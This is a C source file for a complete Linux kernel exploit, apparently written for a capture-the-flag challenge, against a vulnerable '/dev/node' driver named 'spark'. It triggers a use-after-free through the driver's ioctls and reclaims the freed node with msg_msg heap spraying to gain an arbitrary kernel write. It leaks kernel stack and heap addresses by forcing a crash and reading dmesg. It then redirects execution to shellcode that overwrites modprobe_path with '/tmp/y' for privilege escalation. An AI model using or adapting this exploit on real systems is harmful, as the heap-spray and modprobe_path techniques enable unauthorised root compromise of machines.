// musl-gcc exp.c -o exp -static -masm=intel
//
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <stdint.h>
#include <syscall.h>
#include <string.h>
#include <pthread.h>
#include <sys/mman.h>
#include <signal.h>
#include <assert.h>
#include <stdint.h>


#define SPARK_LINK 0x4008D900
#define SPARK_GET_INFO 0x8018D901
#define SPARK_FINALIZE 0xD902
#define SPARK_QUERY 0xC010D903

#define PAUSE scanf("%*c");

struct spark_ioctl_query{
    int fd1;
    int fd2;
    size_t distance;
};

struct Link_Header{
    struct Link_Header *fd, *bk;
};

struct Node {
    size_t id;
    size_t refcount;
    size_t state_lock[4];
    size_t finalized;
    size_t nb_lock[4];
    size_t num_edges;
    struct Link_Header link_header;
    size_t index;
    size_t tra;
};

struct Edge {
    struct Link_Header link_header;
    struct Node* dst_node;
    size_t weight;
};

static int fd[100];

static void link(int a, int b, unsigned int weight) {
  //printf("Creating link between '%d' and '%d' with weight %u\n", a, b, weight);
  assert(ioctl(fd[a], SPARK_LINK, fd[b] | ((unsigned long long) weight << 32)) == 0);
}

static void query(int i, int a, int b) {
  struct spark_ioctl_query qry = {
    .fd1 = fd[a],
    .fd2 = fd[b],
  };
  int ret = ioctl(fd[i], SPARK_QUERY, &qry);
  //printf( "[query] ret = %d\n" , ret );
  //printf("The length of shortest path between '%d' and '%d' is %lld\n", a, b, qry.distance);
}

void get_info( int a ){
    size_t buf[3];
    memset( buf , 0xcc , sizeof(buf) );
    assert( ioctl( fd[a] , SPARK_GET_INFO , buf ) == 0 );
    printf( "[get info %d] " , a );
    for( int i = 0 ; i < 3 ; ++i ){
        printf( "%p " , buf[i] );
    }
    puts("");
}

void spark_open(int i){
    fd[i] = open("/dev/node", O_RDWR);
    assert(fd[i] >= 0);
}

void spark_close( int i ){
    close(fd[i]);
}

void spark_finalize( int i ){
    ioctl(fd[i], SPARK_FINALIZE);
}


// for kmalloc
#include <sys/msg.h>
#include <sys/ipc.h>

struct MsgBuf{
    long mtype;
    char mtext[0x10000]; // 65536
} msgbuf;

int msg_open() {
    int qid;
    if ((qid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT)) == -1) {
        perror("msgget");
        exit(1);
    }
    return qid;
}

void msg_send(int qid, char *data, size_t size) {
    msgbuf.mtype = 1;
    memcpy( msgbuf.mtext , &data[0x30] , size - 0x30 );
    if (msgsnd(qid, &msgbuf, size - 0x30, 0) == -1 ) {
        perror("msgsnd");
        exit(1);
    }
}

void msg_free(int qid, size_t size) {
    msgbuf.mtype = 1;
    if (msgrcv(qid, &msgbuf, size - 0x30, 1, 0) == -1) {
        perror("msgsnd");
        exit(1);
    }
}

void arb_write( int qid , size_t off ){
    struct Node data = {
        .index = off,
    };

    // change content
    msg_free(qid, 0x80);
    msg_send(qid, &data, 0x80);

    query( 20 , 20 ,22 );
}



void crash(){
    puts("[+] Crashing...");
    spark_open(0);
    spark_open(1);
    link(0,1,0);
    spark_close(1);
    spark_finalize(0);
}

size_t kernel_stack, kernel_heap;

void leak(){
    system("/home/spark/exp 1");
    system("dmesg | grep -E 'RSP|RBX' | head -n 2 > /home/spark/leak");

    float tmp;
    size_t rax, rcx;
    FILE *f = fopen("/home/spark/leak", "r");
    fscanf(f, "[ %f] RSP: 0018:%llx EFLAGS: %llx\n", &tmp, &kernel_stack, &tmp);
    fscanf(f, "[ %f] RAX: %llx RBX: %llx RCX: %llx", &tmp, &rax, &kernel_heap, &rcx);
    
    printf( "[+] Leak kernel stack addr: %p\n" , kernel_stack );
    printf( "[+] Leak kernel heap addr: %p\n" , kernel_heap );
}

/*
0xffff98d5cdd2be80:	0xffffffffffffffff	0x000000000088770f
0xffff98d5cdd2be90:	0x000000000088770e	0x000000000088770d
0xffff98d5cdd2bea0:	0x000000000088770c	0x000000000088770b
0xffff98d5cdd2beb0:	0x000000000088770a	0x0000000000887709
0xffff98d5cdd2bec0:	0x0093037d5f064f38	0x0000000000887707
0xffff98d5cdd2bed0:	0x0000000000887706	0x0000000000887705
0xffff98d5cdd2bee0:	0x0000000000887704	0x0000000000887703
0xffff98d5cdd2bef0:	0x0000000000887702	0x0000000000887701
0xffff98d5cdd2bf00:	0x0000000000000000	0x0000000000000000
*/

void shellcode();

#define target_area_szie 0x1000000
size_t cushion[target_area_szie];


int main(int argc,char** argv){

    if(argc == 2){
        crash();
        return 0;
    }

    //size_t kernel_heap = strtoull(argv[1],0,16);    // input RBX by hand
    leak();                                           // change to better way for leak

    struct Node node = {
        .id = 0xffffffffffff,
        .refcount = 0,
        .state_lock = {0},
        .finalized = 1,
        .nb_lock = {0},
        .num_edges = 1,
        .link_header.fd = 0x1111,
        .link_header.bk = 0x2222,
        .index = 0x6666,
        .tra = 0,
    };

    size_t *fake_node = &node;

    for (int i = 0; i < 0x10; i++) spark_open(i);
    for( int i = 1 ; i < 0x10 ; ++i ) link( 0 , 0x10 - i , fake_node[0x10-i]);

    spark_finalize(0);

    spark_open(20);
    spark_open(21);
    spark_open(22);
    link( 20 , 22 , 0 );
    //link( 20 , 21 , 0x7777777 );      // rip
    link( 20 , 21 , shellcode + 4 );
    spark_close(21);                    // free node 21

    query( 0 , 0 , 1 );                 // overwrite node 21

    spark_finalize(20);

    // get UAF node 21
    int qid = msg_open();
    msg_send( qid , &fake_node , 0x80 );

    size_t dis_heap_addr = kernel_heap;
    dis_heap_addr &= ~(target_area_szie-1);
    dis_heap_addr -= target_area_szie * 2;

    printf( "[+] init heap address of distanse array: %p\n" , dis_heap_addr );
    puts( "[+] Searching ..." );

    for( int i = 0 ; i < target_area_szie ; ++i ) cushion[i] = 0x7ffffffffffffff;
    
    // write to userland
    arb_write( qid , ((size_t)cushion - dis_heap_addr) / 8 );

    // find offset
    for( int i = 0 ; i < target_area_szie ; ++i ){
        if( cushion[i] != 0x7ffffffffffffff ){
            printf( "[+] Found at %p %p\n" , i , cushion[i] );
            dis_heap_addr += i * 8;
            printf( "[+] dis_heap_addr: %p\n" , dis_heap_addr );
            break;
        }
    }

    //PAUSE
    size_t kernel_ret_addr = kernel_stack + 0x80a0;
    arb_write( qid , (kernel_ret_addr - dis_heap_addr) / 8 );

    return 0;
}

void shellcode(){
    __asm__(
        "mov rdi, [rsp+0x10];"
        "add rdi, 0x11b2097;"
        "mov rsi, 0x792f706d742f;"  // "/tmp/y"
        "mov [rdi], rsi;"           // modprobe_path
        :::
    );
}
